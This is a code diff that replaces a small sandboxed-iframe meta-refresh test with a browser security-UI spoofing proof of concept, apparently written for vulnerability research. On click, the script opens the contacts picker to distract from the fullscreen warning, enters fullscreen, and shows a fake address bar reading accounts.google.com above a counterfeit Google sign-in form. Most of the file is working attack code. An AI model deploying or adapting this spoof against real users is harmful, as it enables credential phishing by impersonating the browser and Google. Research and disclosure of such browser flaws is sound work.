@@ -1,12 +1,85 @@
-<html>
-<body>
-    <h1>Sandbox Escape Test</h1>
-    <!-- Simulasi Iframe yang di-sandbox -->
-    <iframe 
-        sandbox="allow-same-origin allow-forms" 
-        srcdoc="<html><head><meta http-equiv='refresh' content='2; url=https://google.com'></head><body>Pindah ke Google via Meta...</body></html>"
-        style="width:400px; height:200px;">
-    </iframe>
-    <p>Jika browser pindah ke Google di jendela utama, berarti Meta Refresh membypass restriksi sandbox.</p>
-</body>
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <title>Security UI Spoof - Research</title>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
+        <style>
+            body {
+                margin: 0;
+                padding: 0;
+                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+                overflow: hidden;
+            }         
+            #content {
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                height: 100vh;
+                background-color: #f0f2f5;
+                cursor: pointer;
+            }
+            /* Konten Fake Login */
+            #fake-login {
+                display: none;
+                width: 100%;
+                height: 100%;
+                background: white;
+            }
+        </style>
+    </head>  
+    <body>
+        <div id="content">
+            <div style="text-align: center;">
+                <h1>Click anywhere to continue</h1>
+                <p>Security Research PoC</p>
+            </div>
+        </div>
+
+        <div id="fake-login">
+            <div style="background: #f1f3f4; padding: 8px; border-bottom: 1px solid #ccc; display: flex;">
+                <div style="background: white; border-radius: 20px; padding: 5px 20px; width: 60%; margin: 0 auto; color: #5f6368; font-size: 13px; border: 1px solid #dfe1e5; display: flex; align-items: center;">
+                    <span style="color: green; margin-right: 8px;">🔒</span> accounts.google.com/signin/v2/identifier
+                </div>
+            </div>
+
+            <div style="display: flex; justify-content: center; align-items: center; height: 80vh;">
+                <div style="width: 360px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center;">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="75" alt="Google">
+                    <h2>Sign in</h2>
+                    <p>Use your Google Account</p>
+                    <input type="text" placeholder="Email or phone" style="width: 100%; padding: 12px; margin-top: 20px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box;">
+                    <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 40px;">
+                        <span style="color: #1a73e8; font-weight: bold; cursor: pointer;">Create account</span>
+                        <button style="background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: bold;">Next</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <script>
+            window.onclick = async () => {
+                // BUG UTAMA: Memicu pemilih kontak untuk mengalihkan fokus UI browser
+                (async () => {
+                    try {
+                        // Dialog ini akan muncul dan berpotensi menutupi notifikasi fullscreen
+                        await navigator.contacts.select(["name"], { multiple: false });
+                    } catch (e) {
+                        console.log("Contacts API dismissed");
+                    }
+                })();
+
+                // Transisi ke Fullscreen
+                try {
+                    await document.documentElement.requestFullscreen();
+                    
+                    // Sembunyikan instruksi awal, tampilkan fake login
+                    document.getElementById("content").style.display = "none";
+                    document.getElementById("fake-login").style.display = "block";
+                } catch (err) {
+                    console.error("Fullscreen failed", err);
+                }
+            }
+        </script>
+    </body>
 </html>
